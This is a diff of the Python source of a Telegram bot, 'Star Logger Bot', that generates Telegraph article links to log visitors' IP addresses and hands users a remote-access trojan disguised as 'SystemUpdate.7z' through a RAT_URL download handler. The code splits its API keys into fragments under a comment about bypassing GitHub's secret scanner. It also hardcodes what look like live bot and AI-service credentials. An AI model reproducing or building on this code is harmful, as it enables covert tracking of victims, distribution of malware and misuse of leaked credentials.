@@ -1,4 +1,3 @@
-# language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
 import os
 import time
 import string
@@ -15,37 +14,32 @@ import telebot
 from telebot import types, formatting
 from telegraph import Telegraph
 
-# ---------- CONFIG ----------
 load_dotenv()
 
-BOT_TOKEN   = os.environ.get("BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
-ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
+BOT_TOKEN = os.environ.get("BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
+ADMIN_IDS = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
-WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
+WORKER_URL = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 
-DB_PATH     = os.environ.get("DB_PATH") or "database2.db" 
-PORT        = int(os.environ.get("PORT", 8080))
+DB_PATH = os.environ.get("DB_PATH") or "database2.db"
+PORT = int(os.environ.get("PORT", 8080))
 
-CHANNEL_ID    = -1004336153105
-CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
-SUPPORT       = "@boyfrer"
-REF_REWARD    = 0.1
-REF_MARKUP    = 0.5
-BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
-RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
+CHANNEL_ID = -1004336153105
+CHANNEL_LINK = "https://t.me/+c3xyHely39ozNDYy"
+SUPPORT = "@boyfrer"
+REF_REWARD = 0.1
+REF_MARKUP = 0.5
+BOT_LINK = "https://t.me/StarsLogg_Robot?start="
+RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
 
-# --- ОБХОД СКАНЕРА GITHUB ---
-GROQ_KEY       = "gsk_" + "puMc23GoRu8Kg" + "qvag7BqWGdyb3F" + "YSL63zpSYmcxSSwSKQHRj5qm0"
+GROQ_KEY = "gsk_" + "puMc23GoRu8Kg" + "qvag7BqWGdyb3F" + "YSL63zpSYmcxSSwSKQHRj5qm0"
 OPENROUTER_KEY = "sk-" + "or-v1-65351102" + "d6baf880d50877" + "1bf7081c13709361" + "b0dda4135f9ccd39" + "2c77cc521e"
-# ВНИМАНИЕ: Этот ключ неверный (начинается на AQ.). Замени на свой с Google AI Studio (начинается на AIzaSy)
-GOOGLE_KEY     = "AQ." + "Ab8RN6KhJs9xiYk" + "DT21RNZ86ktVdoj" + "wSgLrAUIUYmgvnhp" + "9piA" 
+GOOGLE_KEY = "AQ." + "Ab8RN6KhJs9xiYk" + "DT21RNZ86ktVdoj" + "wSgLrAUIUYmgvnhp" + "9piA"
 
-# ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 telegraph = Telegraph()
 telegraph.create_account(short_name='Star_Logger_Bot')
 
-# ---------- DB ----------
 def _conn():
     c = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
     c.row_factory = sqlite3.Row
@@ -162,7 +156,6 @@ def get_user_links(user_id, limit=10):
 def get_all_links(limit=20, offset=0):
     with _conn() as c: return c.execute("SELECT l.*, u.username FROM links l LEFT JOIN users u ON l.created_by = u.user_id ORDER BY l.created_at DESC LIMIT ? OFFSET ?", (limit, offset)).fetchall()
 
-# --- НЕЙРОСЕТЬ ЛОГИКА ---
 def check_ai_limit(user_id):
     today = datetime.now().strftime("%Y-%m-%d")
     with _conn() as c:
@@ -176,7 +169,6 @@ def increment_ai_limit(user_id):
     with _conn() as c:
         c.execute("INSERT INTO ai_usage (user_id, date, count) VALUES (?,?,1) ON CONFLICT(user_id, date) DO UPDATE SET count = count + 1", (user_id, today))
 
-# ---------- УТИЛИТЫ ----------
 def check_sub(user_id):
     try:
         status = bot.get_chat_member(CHANNEL_ID, user_id).status
@@ -185,7 +177,7 @@ def check_sub(user_id):
 
 def send_log(text):
     try: bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
-    except Exception as e: print(f"[!] Log error: {e}")
+    except Exception as e: print(f"Log error: {e}")
 
 def slug_gen(n=8):
     return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(n))
@@ -240,7 +232,6 @@ def send_rat_file(chat_id, msg_id=None):
             if tmp_path and os.path.exists(tmp_path): os.remove(tmp_path)
     threading.Thread(target=download_task).start()
 
-# ---------- WEBHOOK ----------
 from flask import Flask, request, jsonify
 web_app = Flask(__name__)
 
@@ -274,10 +265,8 @@ def save_ip():
     return jsonify({"ok": True})
 
 def run_webhook():
-    print(f"[*] Webhook server on port {PORT}")
     web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)
 
-# ---------- МЕНЮ ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
@@ -290,7 +279,6 @@ def show_main_menu(uid):
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(uid, had, f'<b>⭐️Star Logger Bot!{prem}</b>\n=============================\n<b>Главное меню</b>\n💰 Баланс: {get_balance(uid):.2f}$\n🆔 ID: <code>{uid}</code>', reply_markup=kb)
 
-# ---------- START ----------
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     uid = message.from_user.id
@@ -331,7 +319,6 @@ def cb_check_sub(call):
     else:
         bot.answer_callback_query(call.id, "❌ Ты не подписался!", show_alert=True)
 
-# ---------- ПРОФИЛЬ ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
 def cb_cabinet(call):
     uid = call.message.chat.id
@@ -439,7 +426,6 @@ def cb_toggle_anon(call):
     bot.answer_callback_query(call.id, "✅ Обновлено!")
     cb_user_settings(call)
 
-# ---------- AI (НЕЙРОСЕТЬ) ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'ai_menu')
 def cb_ai_menu(call):
     used, max_limit = check_ai_limit(call.from_user.id)
@@ -455,7 +441,7 @@ def cb_ai_menu(call):
     
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("⚡ Groq (Llama 3.3)", callback_data="ask_groq"))
-    kb.add(types.InlineKeyboardButton("🦙 OpenRouter (Llama 3.1)", callback_data="ask_openrouter"))
+    kb.add(types.InlineKeyboardButton("🦙 OpenRouter (Auto Free)", callback_data="ask_openrouter"))
     kb.add(types.InlineKeyboardButton("✨ Gemini (Google)", callback_data="ask_gemini"))
     kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
     
@@ -497,7 +483,7 @@ def process_ai_request(message, model):
                 timeout=25
             )
             if res.ok: answer = res.json()["choices"][0]["message"]["content"]
-            else: answer = f"Ошибка Groq API (код {res.status_code})"
+            else: answer = f"Ошибка Groq API (код {res.status_code}): {res.text[:100]}"
 
         elif model == "openrouter":
             res = requests.post(
@@ -508,11 +494,11 @@ def process_ai_request(message, model):
                     "HTTP-Referer": "https://t.me/StarsLogg_Robot",
                     "X-Title": "Star Logger Bot"
                 },
-                json={"model": "meta-llama/llama-3.1-8b-instruct:free", "messages": [{"role": "user", "content": prompt}]},
+                json={"model": "openrouter/free", "messages": [{"role": "user", "content": prompt}]},
                 timeout=25
             )
             if res.ok: answer = res.json()["choices"][0]["message"]["content"]
-            else: answer = f"Ошибка OpenRouter (код {res.status_code})"
+            else: answer = f"Ошибка OpenRouter (код {res.status_code}): {res.text[:100]}"
             
         elif model == "gemini":
             res = requests.post(
@@ -535,7 +521,6 @@ def process_ai_request(message, model):
     except Exception as e:
         bot.edit_message_text(f"❌ Ошибка сети: {e}", chat_id=uid, message_id=msg.message_id)
 
-# ---------- ПОДПИСКА ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'buy_premium_menu')
 def cb_buy_premium_menu(call):
     uid = call.from_user.id
@@ -585,7 +570,6 @@ def cb_get_rat_exe(call):
     bot.answer_callback_query(call.id)
     send_rat_file(call.from_user.id)
 
-# ---------- МАНУАЛ ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'manual')
 def cb_manual(call):
     text = (
@@ -600,7 +584,6 @@ def cb_manual(call):
     bot.send_message(call.from_user.id, text, reply_markup=kb, disable_web_page_preview=True)
     bot.answer_callback_query(call.id)
 
-# ---------- АДМИНКА ----------
 @bot.message_handler(commands=['admin'])
 def cmd_admin(m):
     if m.chat.id not in ADMIN_IDS: return
@@ -738,7 +721,6 @@ def cb_admin_dump(call):
     except: pass
     bot.answer_callback_query(call.id)
 
-# ---------- ЛОГГЕР ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'logger')
 def cb_logger(call):
     user = get_user_info(call.from_user.id)
@@ -846,7 +828,6 @@ def _cust_img(message):
     msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id, username)
     bot.send_message(message.chat.id, msg)
 
-# ---------- ENTRY ----------
 if __name__ == "__main__":
     db_init()
     threading.Thread(target=run_webhook, daemon=True).start()
